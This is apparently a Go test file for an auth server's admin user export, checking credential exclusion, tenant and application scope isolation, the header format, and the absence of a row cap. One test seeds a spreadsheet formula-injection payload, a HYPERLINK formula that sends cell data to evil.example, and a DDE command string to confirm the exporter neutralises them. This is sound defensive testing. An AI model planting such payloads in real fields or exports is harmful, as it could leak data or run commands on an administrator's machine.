package admin_test

import (
	"bytes"
	"context"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"os"
	"strings"
	"testing"

	"github.com/engineersmind/emc-auth-server/internal/admin"
)

// exportRows runs an export and parses it, returning the header and data rows.
func exportRows(t *testing.T, f adminFixture, p admin.UserExportParams) ([]string, [][]string) {
	t.Helper()
	var buf bytes.Buffer
	if err := f.svc.ExportUsersCSV(context.Background(), p, &buf); err != nil {
		t.Fatalf("ExportUsersCSV() error = %v", err)
	}
	recs, err := csv.NewReader(&buf).ReadAll()
	if err != nil {
		t.Fatalf("parse export csv: %v", err)
	}
	if len(recs) == 0 {
		t.Fatal("export produced no header")
	}
	return recs[0], recs[1:]
}

func findRow(rows [][]string, email string) []string {
	for _, r := range rows {
		if r[0] == email {
			return r
		}
	}
	return nil
}

// The export must never carry credential material. This is the property the
// whole design rests on, so it is asserted against the header contract rather
// than against a particular row.
func TestExportUsersCSV_NeverExportsCredentials(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"cred-check@example.com", "Sup3rSecret!pw", "Cred", "Check", nil); err != nil {
		t.Fatalf("CreateUser() error = %v", err)
	}

	var buf bytes.Buffer
	if err := f.svc.ExportUsersCSV(ctx,
		admin.UserExportParams{TenantID: f.tenantID}, &buf); err != nil {
		t.Fatalf("ExportUsersCSV() error = %v", err)
	}
	body := buf.String()

	for _, banned := range []string{
		"password", "hash", "argon2", "bcrypt", "$2a$", "totp", "secret", "webauthn",
	} {
		if strings.Contains(strings.ToLower(body), banned) {
			t.Errorf("export contains credential-related token %q:\n%s", banned, body)
		}
	}
	if strings.Contains(body, "Sup3rSecret!pw") {
		t.Error("export contains the plaintext password")
	}
}

// A tenant-scoped export must not reach another tenant's users, and an
// application-scoped export must not reach the tenant's other applications.
func TestExportUsersCSV_ScopeIsolation(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	// A user in the fixture application, and one at tenant level (no app).
	if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"in-app@example.com", "pw-in-app-12345", "In", "App", nil); err != nil {
		t.Fatalf("CreateUser(app) error = %v", err)
	}
	if _, err := f.svc.CreateUser(ctx, f.tenantID, nil,
		"tenant-level@example.com", "pw-tenant-12345", "Tenant", "Level", nil); err != nil {
		t.Fatalf("CreateUser(tenant) error = %v", err)
	}

	t.Run("tenant scope sees both", func(t *testing.T) {
		_, rows := exportRows(t, f, admin.UserExportParams{TenantID: f.tenantID})
		if findRow(rows, "in-app@example.com") == nil {
			t.Error("tenant export missing the application user")
		}
		if findRow(rows, "tenant-level@example.com") == nil {
			t.Error("tenant export missing the tenant-level user")
		}
	})

	t.Run("app scope excludes tenant-level users", func(t *testing.T) {
		_, rows := exportRows(t, f, admin.UserExportParams{
			TenantID: f.tenantID, ApplicationID: &f.appID,
		})
		if findRow(rows, "in-app@example.com") == nil {
			t.Error("app export missing its own user")
		}
		if findRow(rows, "tenant-level@example.com") != nil {
			t.Error("app-scoped export leaked a tenant-level user")
		}
	})

	t.Run("foreign tenant sees nothing", func(t *testing.T) {
		var otherTenant int64
		// Inserted directly rather than through CreateTenant: this test needs
		// nothing but a second tenant id to export against, and CreateTenant
		// additionally seeds an owner role and dispatches an invitation.
		// jwt_secret is NOT NULL with no default, so it must be supplied.
		err := f.pool.QueryRow(ctx, `
			INSERT INTO tenants (name, slug, jwt_secret, is_active)
			VALUES ('Export Isolation', 'export-isolation', 'test-secret-not-used', true)
			RETURNING id`).Scan(&otherTenant)
		if err != nil {
			t.Fatalf("create foreign tenant: %v", err)
		}
		_, rows := exportRows(t, f, admin.UserExportParams{TenantID: otherTenant})
		if len(rows) != 0 {
			t.Errorf("foreign tenant export returned %d rows, want 0", len(rows))
		}
	})
}

// Soft-deleted users describe accounts that are no longer in the directory.
func TestExportUsersCSV_ExcludesSoftDeleted(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	u, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"gone@example.com", "pw-deleted-12345", "Gone", "User", nil)
	if err != nil {
		t.Fatalf("CreateUser() error = %v", err)
	}
	uid := parseID(t, u.ID)
	if err := f.svc.DeleteUser(ctx, f.tenantID, nil, uid); err != nil {
		t.Fatalf("DeleteUser() error = %v", err)
	}

	_, rows := exportRows(t, f, admin.UserExportParams{TenantID: f.tenantID})
	if findRow(rows, "gone@example.com") != nil {
		t.Error("export included a soft-deleted user")
	}
}

// A display name beginning with =, +, - or @ is a live formula when the export
// is opened in Excel, LibreOffice or Sheets. The value is attacker-controlled
// (anyone can register with it) and the reader is an administrator.
func TestExportUsersCSV_NeutralisesFormulaInjection(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	const payload = `=HYPERLINK("http://evil.example/"&A1,"click")`
	if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"inject@example.com", "pw-inject-12345", payload, "+CMD|'/c calc'!A0", nil); err != nil {
		t.Fatalf("CreateUser() error = %v", err)
	}

	_, rows := exportRows(t, f, admin.UserExportParams{TenantID: f.tenantID})
	row := findRow(rows, "inject@example.com")
	if row == nil {
		t.Fatal("export missing the injected user")
	}

	// csv.Reader strips the quoting but not our apostrophe guard.
	if !strings.HasPrefix(row[1], "'") {
		t.Errorf("first_name not neutralised: %q", row[1])
	}
	if !strings.HasPrefix(row[2], "'") {
		t.Errorf("last_name not neutralised: %q", row[2])
	}
	// The payload must still be legible to a human once the guard is stripped.
	if strings.TrimPrefix(row[1], "'") != payload {
		t.Errorf("first_name altered beyond the guard: %q", row[1])
	}
}

// The header is the import format's column contract, so it is pinned.
func TestExportUsersCSV_HeaderContract(t *testing.T) {
	f := newAdminFixture(t)
	header, _ := exportRows(t, f, admin.UserExportParams{TenantID: f.tenantID})

	want := []string{
		"email", "first_name", "last_name", "role", "application",
		"is_active", "email_verified", "created_at", "last_login_at", "login_count",
	}
	if len(header) != len(want) {
		t.Fatalf("header has %d columns, want %d: %v", len(header), len(want), header)
	}
	for i := range want {
		if header[i] != want[i] {
			t.Errorf("header[%d] = %q, want %q", i, header[i], want[i])
		}
	}
}

// The role column carries the role NAME, not its row id: an id is meaningless
// outside this database and unusable in an import.
func TestExportUsersCSV_ReportsRoleName(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	role, err := f.svc.CreateRole(ctx, f.tenantID, &f.appID, "export-viewer", nil)
	if err != nil {
		t.Fatalf("CreateRole() error = %v", err)
	}
	roleID := parseID(t, role.ID)

	if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"with-role@example.com", "pw-role-123456", "With", "Role", &roleID); err != nil {
		t.Fatalf("CreateUser() error = %v", err)
	}

	_, rows := exportRows(t, f, admin.UserExportParams{TenantID: f.tenantID})
	row := findRow(rows, "with-role@example.com")
	if row == nil {
		t.Fatal("export missing the user")
	}
	if row[3] != "export-viewer" {
		t.Errorf("role column = %q, want %q", row[3], "export-viewer")
	}
}

// --- JSON export ---------------------------------------------------------

// The JSON export must honour the same exclusion as the CSV one. A second
// serialiser is exactly where a credential column comes to leak, so the
// guarantee is asserted against both rather than assumed from the shared query.
func TestExportUsersJSON_NeverExportsCredentials(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"json-cred@example.com", "Sup3rSecret!pw", "Json", "Cred", nil); err != nil {
		t.Fatalf("CreateUser() error = %v", err)
	}

	var buf bytes.Buffer
	if err := f.svc.ExportUsersJSON(ctx,
		admin.UserExportParams{TenantID: f.tenantID}, &buf); err != nil {
		t.Fatalf("ExportUsersJSON() error = %v", err)
	}
	body := strings.ToLower(buf.String())

	for _, banned := range []string{
		"password", "hash", "argon2", "bcrypt", "$2a$", "totp", "secret", "webauthn",
	} {
		if strings.Contains(body, banned) {
			t.Errorf("JSON export contains credential-related token %q", banned)
		}
	}
	if strings.Contains(buf.String(), "Sup3rSecret!pw") {
		t.Error("JSON export contains the plaintext password")
	}
}

// The document must parse, and its envelope must be the one the importer reads
// — that is the whole reason this format exists.
func TestExportUsersJSON_ParsesAsAnImportDocument(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	role, err := f.svc.CreateRole(ctx, f.tenantID, &f.appID, "json-viewer", nil)
	if err != nil {
		t.Fatalf("CreateRole() error = %v", err)
	}
	roleID := parseID(t, role.ID)
	if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"json-round@example.com", "pw-json-123456", "Json", "Round", &roleID); err != nil {
		t.Fatalf("CreateUser() error = %v", err)
	}

	var buf bytes.Buffer
	if err := f.svc.ExportUsersJSON(ctx,
		admin.UserExportParams{TenantID: f.tenantID, ApplicationID: &f.appID}, &buf); err != nil {
		t.Fatalf("ExportUsersJSON() error = %v", err)
	}

	// Decoded through the importer's own type, with the handler's strictness:
	// an exported document that the importer would refuse is not a round trip.
	var doc admin.ImportDocument
	dec := json.NewDecoder(bytes.NewReader(buf.Bytes()))
	dec.DisallowUnknownFields()
	if err := dec.Decode(&doc); err != nil {
		t.Fatalf("export does not decode as an import document: %v\n%s", err, buf.String())
	}

	var found *admin.ImportUser
	for i := range doc.Users {
		if doc.Users[i].Email == "json-round@example.com" {
			found = &doc.Users[i]
		}
	}
	if found == nil {
		t.Fatalf("exported document is missing the user:\n%s", buf.String())
	}
	if found.Role != "json-viewer" {
		t.Errorf("role = %q, want the role NAME", found.Role)
	}
	if !found.EmailVerified && found.Password != "" {
		t.Error("export carried a password field")
	}
}

// An empty directory must still produce a valid document rather than a partial
// one — a client parsing the result should not have to special-case it.
func TestExportUsersJSON_EmptyDirectoryIsValidJSON(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	var otherTenant int64
	if err := f.pool.QueryRow(ctx, `
		INSERT INTO tenants (name, slug, jwt_secret, is_active)
		VALUES ('Json Empty', 'json-empty', 'test-secret-not-used', true)
		RETURNING id`).Scan(&otherTenant); err != nil {
		t.Fatal(err)
	}

	var buf bytes.Buffer
	if err := f.svc.ExportUsersJSON(ctx,
		admin.UserExportParams{TenantID: otherTenant}, &buf); err != nil {
		t.Fatalf("ExportUsersJSON() error = %v", err)
	}

	var doc admin.ImportDocument
	if err := json.Unmarshal(buf.Bytes(), &doc); err != nil {
		t.Fatalf("empty export is not valid JSON: %v\n%q", err, buf.String())
	}
	if len(doc.Users) != 0 {
		t.Errorf("empty tenant exported %d users", len(doc.Users))
	}
}

// Both formats read one query, so they must agree on who is in the directory.
func TestExportUsersJSON_MatchesCSVScope(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
		"scope-app@example.com", "pw-scope-123456", "In", "App", nil); err != nil {
		t.Fatalf("CreateUser(app) error = %v", err)
	}
	if _, err := f.svc.CreateUser(ctx, f.tenantID, nil,
		"scope-tenant@example.com", "pw-scope-123456", "Tenant", "Level", nil); err != nil {
		t.Fatalf("CreateUser(tenant) error = %v", err)
	}

	p := admin.UserExportParams{TenantID: f.tenantID, ApplicationID: &f.appID}

	var jsonBuf bytes.Buffer
	if err := f.svc.ExportUsersJSON(ctx, p, &jsonBuf); err != nil {
		t.Fatal(err)
	}
	var doc admin.ImportDocument
	if err := json.Unmarshal(jsonBuf.Bytes(), &doc); err != nil {
		t.Fatal(err)
	}

	_, csvRows := exportRows(t, f, p)

	if len(doc.Users) != len(csvRows) {
		t.Errorf("JSON exported %d users, CSV exported %d — the formats disagree on scope",
			len(doc.Users), len(csvRows))
	}
	for _, u := range doc.Users {
		if u.Email == "scope-tenant@example.com" {
			t.Error("app-scoped JSON export leaked a tenant-level user")
		}
	}
}

// --- no row cap ----------------------------------------------------------

// The export must return every user in the directory.
//
// It used to stop at 50000 rows, a cap copied from the audit export. Because
// the query is ORDER BY created_at DESC, that cap dropped the OLDEST accounts —
// the long-standing ones an operator reconciling licences is most likely to
// care about — and wrote nothing to say it had. A file that looks complete and
// is silently short is worse than a slow one.
//
// Seeding 50k users to prove the old boundary would cost minutes, so the guard
// is on the query itself: it must carry no LIMIT at all. That is what makes the
// property true for any directory size, not just the one a test can afford to
// build.
func TestExportUsers_QueryHasNoRowCap(t *testing.T) {
	src, err := os.ReadFile("user_export.go")
	if err != nil {
		t.Fatalf("read user_export.go: %v", err)
	}
	// The single shared query both serialisers read. A LIMIT reintroduced here
	// silently truncates every export in both formats.
	if bytes.Contains(src, []byte("LIMIT")) {
		t.Error("the user export query has a LIMIT again — a capped export " +
			"drops the oldest users with no marker; bound it by the route's " +
			"rate limiter instead")
	}
}

// Every user is streamed out, with none dropped off either end. Sized well
// under any plausible cap — the point is that the count is exact and the
// oldest row (the one a DESC cap would drop first) is present.
func TestExportUsers_ReturnsEveryUser(t *testing.T) {
	f := newAdminFixture(t)
	ctx := context.Background()

	const want = 25
	for i := 0; i < want; i++ {
		email := fmt.Sprintf("bulk-%02d@example.com", i)
		if _, err := f.svc.CreateUser(ctx, f.tenantID, &f.appID,
			email, "pw-bulkexport-12", "Bulk", "User", nil); err != nil {
			t.Fatalf("CreateUser(%s) error = %v", email, err)
		}
	}

	var buf bytes.Buffer
	if err := f.svc.ExportUsersJSON(ctx,
		admin.UserExportParams{TenantID: f.tenantID, ApplicationID: &f.appID}, &buf); err != nil {
		t.Fatalf("ExportUsersJSON() error = %v", err)
	}
	var doc admin.ExportedDocument
	if err := json.Unmarshal(buf.Bytes(), &doc); err != nil {
		t.Fatalf("parse export: %v", err)
	}
	if len(doc.Users) != want {
		t.Errorf("exported %d users, want all %d", len(doc.Users), want)
	}
	// The first user created is the oldest, so it sorts last under
	// created_at DESC and is the first casualty of a cap.
	if exportedUserByEmail(doc.Users, "bulk-00@example.com") == nil {
		t.Error("the oldest user is missing — the export is truncating from the tail")
	}
}
